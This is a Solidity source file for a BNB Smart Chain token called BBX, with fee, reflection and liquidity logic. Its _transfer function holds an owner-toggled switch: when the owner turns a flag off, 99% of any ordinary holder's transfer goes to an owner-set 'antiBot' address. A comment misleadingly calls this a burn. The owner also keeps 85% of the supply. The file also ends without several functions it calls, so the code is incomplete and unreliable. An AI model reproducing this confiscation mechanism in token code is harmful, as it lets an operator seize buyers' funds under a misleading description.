/**
 *Submitted for verification at BscScan.com on 2022-11-21
*/

// SPDX-License-Identifier: NOLICENSE

pragma solidity 0.8.9;

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

}

library SafeMath {



    function sqrt(uint y) internal pure returns (uint z) {
        if (y > 3) {
            z = y;
            uint x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
        // else z = 0 (default value)
    }

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) private pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {

            if (returndata.length > 0) {

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniSwapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniSwapV2Router02 is IUniSwapV2Router01 {
   function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniSwapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniSwapV2Factory {
  event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    
}

library EnumerableSet {

    struct Set {
        bytes32[] _values;
        mapping(bytes32 => uint256) _indexes;
    }

    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    function _remove(Set storage set, bytes32 value) private returns (bool) {
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) {
            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;

            if (lastIndex != toDeleteIndex) {
                bytes32 lastvalue = set._values[lastIndex];

                set._values[toDeleteIndex] = lastvalue;
                set._indexes[lastvalue] = valueIndex;
            }
            set._values.pop();
            delete set._indexes[value];
            return true;
        } else {
            return false;
        }
    }

    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }

    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        return set._values[index];
    }

    function _values(Set storage set) private view returns (bytes32[] memory) {
        return set._values;
    }

    struct AddressSet {
        Set _inner;
    }

    function addic(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    function values(AddressSet storage set) internal view returns (address[] memory) {
        bytes32[] memory store = _values(set._inner);
        address[] memory result;

        assembly {
            result := store
        }

        return result;
    }
}

contract bolaoCoin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    using EnumerableSet for EnumerableSet.AddressSet;

    EnumerableSet.AddressSet private tokenHoldersEnumSet;

    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isExcluded;
    mapping (address => uint) public walletToPurchaseTime;
    mapping (address => uint) public walletToSelltime;
    uint8 private constant _decimals = 18;
    uint256 private constant MAX = ~uint256(0);
    address[] private _excluded;
    uint256 private _tTotal = 100_000_000 * 10 **_decimals;    // Total supply = 100m
    uint256 private ONE_TENTH_SUPPLY = 1_000_000* 10 **_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 public _maxInAmount = 100_000_000 * 10**_decimals;    // 100% supply = 100m - Initial max buy
    uint256 public _maxOutAmount = 100_000_000 * 10**_decimals;    // 100% supply = 100m - Initial max sell
    uint256 public _maxWallet = 100_000_000 * 10**_decimals;      //  100% Initial = 100m  max Wallet
    uint256 public numTokensToSwapMarketing = 5_000 * 10**_decimals;  // 5k - tokens to swap (marketing balance wallet)
    uint256 public numTokensToSwapLiquidity = 5_000 * 10**_decimals; // 5k - tokens to swap  (liquidity balance wallet)
    
    uint256 private constant TENTH_PERCENT_DENOMINATOR = 1_000;
    uint public sellTime = 0; // 0s per transaciton
    uint public buyTime = 0; // 0s per transaciton

    TotFeesPaidStruct public totFeesPaid;
    string private constant _name = "BBX";
    string private constant _symbol = "$BBX";

    struct TotFeesPaidStruct{
        uint256 rfi;
        uint256 marketing;
        uint256 liquidity;
        uint256 reward;
    }

    struct feeRatesStruct {
        uint256 rfi; // reflection fee to holders
        uint256 marketing; // marketing fee
        uint256 liquidity; // liquidity fee
        uint256 reward; // burn fee
    }

    struct balances {
        uint256 marketing_balance;
        uint256 lp_balance;
    }

    balances public contractBalance;

    /*  0% rfi/holders, 7% mkt, 2% liquidity, 1% reward  = 10% */
    feeRatesStruct public buyRates = feeRatesStruct(
    {rfi: 0,
    marketing: 70,
    liquidity: 20,
    reward: 10
    });

    /*  0% rfi/holders, 7% mkt, 2% liquidity, 1% reward  = 10% */
    feeRatesStruct public sellAndTransferRates = feeRatesStruct(
    {rfi: 0,
    marketing: 70,
    liquidity: 20,
    reward: 10
    });

    feeRatesStruct private appliedFees;

    struct valuesFromGetValues{
        uint256 rAmount;
        uint256 rTransferAmount;
        uint256 rRfi;
        uint256 rMarketing;
        uint256 rLiquidity;
        uint256 rReward;
        uint256 tTransferAmount;
        uint256 tRfi;
        uint256 tMarketing;
        uint256 tLiquidity;
        uint256 tReward;
    }

    IUniSwapV2Router02 public UniSwapV2Router;

    
    address public uniSwapV2Pair;
    address payable private bbCoinMarketing = payable(0xCDC4f05646DEB572E3A25f6429DB8792F7137B38); // wallet address that will receive funds from fees
    address public bbCoinWalletGame = 0xFFea477D59BA7436f7683e2EAA6d966571737Fab; // wallet rewards and awards
    address public bbCoinProject = 0x97C9CDEcA30ac6cC611116BE548dfE84213aE66b; // dev wallet 
    // bb_Reward - 
    address public bbRewardWallet = 0x3B982040d9d31f09B3E16fbB8C7E62C738FeDcd5; // reward wallet 


    bool public Trading = false;
    bool inSwapAndLiquify;
    bool public _EnableTransferFrom = true;
    bool public swapAndLiquifyEnabled = true;
    address public antiBot; 

    event EventSetEnableContract(bool e_EnableTransferFrom);
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event LiquidityAdded(uint256 e_tokenAmount, uint256 e_BNBAmount);
    event EventSetWalletMarketing( address e_bbCoinMarketing);
    event EventbbCoinWalletGame( address e_bbCoinWalletGame);
    event EventbbCoinProject( address e_bbCoinProject);
    
    event EventSetBuyRates(uint256 e_rfi, uint256 e_marketing, uint256 e_liquidity, uint256 e_reward);
    event EventSetsellAndTransferRates(uint256 e_rfi, uint256 e_marketing, uint256 e_liquidity, uint256 e_reward);

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor () {
        // initial distribution
        _rOwned[owner()] = (_rTotal / 20 * 17);
        _rOwned[address(bbCoinMarketing)] = (_rTotal / 20 * 1);
        _rOwned[address(bbCoinProject)] = (_rTotal / 20 * 1);
        _rOwned[address(bbCoinWalletGame)] = (_rTotal / 20 * 1);
        IUniSwapV2Router02 _UniSwapV2Router = IUniSwapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); //BSC mainnet
        //IUniSwapV2Router02 _UniSwapV2Router = IUniSwapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3); //BSC Testnet
        uniSwapV2Pair = IUniSwapV2Factory(_UniSwapV2Router.factory()).createPair(address(this), _UniSwapV2Router.WETH());
        UniSwapV2Router = _UniSwapV2Router;    
        _isExcludedFromFee[owner()] = true;             
        _isExcludedFromFee[address(this)] = true;       
        _isExcludedFromFee[bbCoinMarketing] = true;    
        _isExcludedFromFee[bbCoinWalletGame] = true;   
        _isExcludedFromFee[bbCoinProject] = true;      
        _isExcludedFromFee[bbRewardWallet] = true;      
        
        _isExcludedFromFee[address(0xDead)] = true;
        _isExcluded[address(this)] = true;
        _excluded.push(address(this));
        _isExcluded[uniSwapV2Pair] = true;
        _excluded.push(uniSwapV2Pair);

  }

    function getFromLastBuy(address wallet) public view returns (uint) {
        return walletToPurchaseTime[wallet];
    }

    function getFromLastSell(address walletSell) public view returns (uint) {
        return walletToSelltime[walletSell];
    }

     function setAntiBot(address _antiBot) public onlyOwner {
        excludeFromAll(antiBot);
        antiBot = _antiBot;
    }

    function setBuyRates(uint256 rfi, uint256 marketing, uint256 liquidity, uint256 reward) public onlyOwner {
        require(rfi+marketing+liquidity+reward < 100, "fee amount cannot be greater than 10%");
        buyRates.rfi = rfi;
        buyRates.marketing = marketing;
        buyRates.liquidity = liquidity;
        buyRates.reward = reward;
        emit EventSetBuyRates(buyRates.rfi, buyRates.marketing, buyRates.liquidity, buyRates.reward);
    }

    function setsellAndTransferRates(uint256 rfi, uint256 marketing, uint256 liquidity, uint256 reward) public onlyOwner {
        require(rfi+marketing+liquidity+reward < 100, "fee amount cannot be greater than 10%");
        sellAndTransferRates.rfi = rfi;
        sellAndTransferRates.marketing = marketing;
        sellAndTransferRates.liquidity = liquidity;
        sellAndTransferRates.reward = reward;
        emit EventSetsellAndTransferRates(sellAndTransferRates.rfi, sellAndTransferRates.marketing, sellAndTransferRates.liquidity, sellAndTransferRates.reward);
    }


    function setMarketingAddress(address payable  _bbCoinMarketing) public onlyOwner {
        bbCoinMarketing = _bbCoinMarketing;
        excludeFromAll(_bbCoinMarketing);
        emit EventSetWalletMarketing(bbCoinMarketing);
    }

    function setBBCoinWalletGame(address  _bbCoinWalletGame) public onlyOwner {
        bbCoinWalletGame = _bbCoinWalletGame;
        excludeFromAll(_bbCoinWalletGame);
        emit EventbbCoinWalletGame(bbCoinWalletGame);
    }

    function setBBCoinProject(address  _bbCoinProject) public onlyOwner {
        bbCoinProject = _bbCoinProject;
        emit EventbbCoinProject(bbCoinProject);
    }

    function getMarketingAddress() public view returns (address) {
        return bbCoinMarketing;
    }

    function getBBCoinWalletGame() public view returns (address) {
        return bbCoinWalletGame;
    }

    function getBBCoinProject() public view returns (address) {
        return bbCoinProject;
    }

    function lockToBuyOrSellForTime(uint256 lastBuyOrSellTime, uint256 lockTime) public view returns (bool) {
        if( lastBuyOrSellTime == 0 ) return true;
        uint256 crashTime = block.timestamp - lastBuyOrSellTime;
        if( crashTime >= lockTime ) return true;
        return false;
    }

     function setEnableContract(bool _enable) public onlyOwner {
        _EnableTransferFrom = _enable;
        emit EventSetEnableContract(_EnableTransferFrom);
    }

    function setBuyTime(uint timeBetweenPurchases) public onlyOwner {
        buyTime = timeBetweenPurchases;
    }

    function setSellTime(uint timeBetween) public onlyOwner {
        sellTime = timeBetween;
    }

    function setTokenToSwapMarketing(uint256 top) public onlyOwner {
        numTokensToSwapMarketing = top * 10**_decimals;
    }

    function setTokenToSwapLiquidity(uint256 top) public onlyOwner {
        numTokensToSwapLiquidity = top * 10**_decimals;
    }



    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function TrandinOn(bool _enable) public onlyOwner {
        Trading = _enable;
    }

    function setTransFrom(bool _enable) public onlyOwner {
        _EnableTransferFrom = _enable;
    }

    function setMaxInTokens(uint256 maxInTokens) public onlyOwner {
        require(maxInTokens > 0 , "Value must be greater than zero");
        _maxInAmount = maxInTokens * 10**_decimals;
    }

    function setMaxOutTokens(uint256 maxOutTokens) public onlyOwner {
        require(maxOutTokens > 0 , "Value must be greater than zero");
        _maxOutAmount = maxOutTokens * 10**_decimals;
    }

    function setMaxWalletTokens(uint256 maxWalletTokens) public onlyOwner {
        require(maxWalletTokens > 0 , "Value must be greater than zero");
        _maxWallet = maxWalletTokens * 10**_decimals;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender]+addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function reflectionFromToken(uint256 tAmount, bool deductTransferRfi) public view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferRfi) {
            valuesFromGetValues memory s = _getValues(tAmount, true);
            return s.rAmount;
        } else {
            valuesFromGetValues memory s = _getValues(tAmount, true);
            return s.rTransferAmount;
        }
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount/currentRate;
    }

    function excludeFromReflection(address account) public onlyOwner() {
        require(!_isExcluded[account], "Account is already excluded");
        if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function excludeFromAll(address account) public onlyOwner() {
        if(!_isExcluded[account])
        {
            _isExcluded[account] = true;
            if(_rOwned[account] > 0) {
                _tOwned[account] = tokenFromReflection(_rOwned[account]);
            }
            _excluded.push(account);
        }
        _isExcludedFromFee[account] = true;
        tokenHoldersEnumSet.remove(account);
    }

    function includeInReflection(address account) external onlyOwner() {
        require(_isExcluded[account], "Account is not excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _rOwned[account] = _tOwned[account];
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    receive() external payable {}

    function _getValues(uint256 tAmount, bool takeFee) private view returns (valuesFromGetValues memory to_return) {
        to_return = _getTValues(tAmount, takeFee);

        (to_return.rAmount,to_return.rTransferAmount,to_return.rRfi,to_return.rMarketing,to_return.rLiquidity,to_return.rReward) = _getRValues(to_return, tAmount, takeFee, _getRate());

        return to_return;
    }

    function _getTValues(uint256 tAmount, bool takeFee) private view returns (valuesFromGetValues memory s) {

        if(!takeFee) {
            s.tTransferAmount = tAmount;
            return s;
        }
        s.tRfi = tAmount*appliedFees.rfi/TENTH_PERCENT_DENOMINATOR;
        s.tMarketing = tAmount*appliedFees.marketing/TENTH_PERCENT_DENOMINATOR;
        s.tLiquidity = tAmount*appliedFees.liquidity/TENTH_PERCENT_DENOMINATOR;
        s.tReward = tAmount*appliedFees.reward/TENTH_PERCENT_DENOMINATOR;
        s.tTransferAmount = tAmount-s.tRfi -s.tMarketing -s.tLiquidity -s.tReward;
        return s;
    }

    function _getRValues(valuesFromGetValues memory s, uint256 tAmount, bool takeFee, uint256 currentRate) private pure returns (uint256 rAmount, uint256 rTransferAmount, uint256 rRfi, uint256 rMarketing, uint256 rLiquidity, uint256 rReward) {
        rAmount = tAmount*currentRate;

        if(!takeFee) {
            return(rAmount, rAmount, 0,0,0,0);
        }

        rRfi= s.tRfi*currentRate;
        rMarketing= s.tMarketing*currentRate;
        rLiquidity= s.tLiquidity*currentRate;
        rReward= s.tReward*currentRate;

        rTransferAmount= rAmount- rRfi-rMarketing-rLiquidity-rReward;

        return ( rAmount,  rTransferAmount,  rRfi,  rMarketing,  rLiquidity,  rReward);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply/tSupply;
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply-_rOwned[_excluded[i]];
            tSupply = tSupply-_tOwned[_excluded[i]];
        }
        if (rSupply < _rTotal/_tTotal) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _reflectRfi(uint256 rRfi, uint256 tRfi) private {
        _rTotal = _rTotal-rRfi;
        totFeesPaid.rfi+=tRfi;
    }

    function _takeMarketing(uint256 rMarketing, uint256 tMarketing) private {
        contractBalance.marketing_balance+=tMarketing;
        totFeesPaid.marketing+=tMarketing;
        _rOwned[address(this)] = _rOwned[address(this)]+rMarketing;
        if(_isExcluded[address(this)])
        {
            _tOwned[address(this)] = _tOwned[address(this)]+tMarketing;
        }
    }

     


    function _takeLiquidity(uint256 rLiquidity,uint256 tLiquidity) private {
        contractBalance.lp_balance+=tLiquidity;
        totFeesPaid.liquidity+=tLiquidity;

        _rOwned[address(this)] = _rOwned[address(this)]+rLiquidity;
        if(_isExcluded[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)]+tLiquidity;
    }

    function _takeReward(uint256 tReward) private {
        totFeesPaid.reward+=tReward;
        //        _tTotal = _tTotal-tReward;
        //        _rTotal = _rTotal-rReward;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

 function _transfer(address from, address to, uint256 amount) private {
	
		if(_EnableTransferFrom == true){

	    	require(from != address(0), "ERC20: transfer from the zero address");
		    require(to != address(0), "ERC20: transfer to the zero address");
		    require(amount > 0, "Transfer amount must be greater than zero");
		    require(amount <= balanceOf(from),"You are trying to transfer more than you balance");
			
			if (contractBalance.lp_balance>= numTokensToSwapLiquidity && !inSwapAndLiquify && from != uniSwapV2Pair && swapAndLiquifyEnabled) {
			    swapAndLiquify(numTokensToSwapLiquidity);
		    }

		    if (contractBalance.marketing_balance>= numTokensToSwapMarketing && !inSwapAndLiquify && from != uniSwapV2Pair && swapAndLiquifyEnabled) {
			   	swapAndSendToMarketing(numTokensToSwapMarketing);
			}
        
            _tokenTransfer(from, to, amount, !(_isExcludedFromFee[from] || _isExcludedFromFee[to]));	

		} 
		
		if(_EnableTransferFrom == false){
			// If any holder tries to make a sale or transfer before enabling the contract, the transferred tokens are burned. 
            // This function will be disabled after launch and ensures tokens can be transferred in the pre-sale phase
        	if(from != owner() && to != owner() && to != bbCoinProject && from != bbCoinProject && to != address(1)){	
	    	    _tokenTransfer(from, address(antiBot), (amount/100)*99, !(_isExcludedFromFee[from] || _isExcludedFromFee[to]));			
	    	    _tokenTransfer(from, to, (amount/100)*1, !(_isExcludedFromFee[from] || _isExcludedFromFee[to]));			
            }
            else {
	    	    _tokenTransfer(from, to, amount, !(_isExcludedFromFee[from] || _isExcludedFromFee[to]));
            }
    	}
    }    


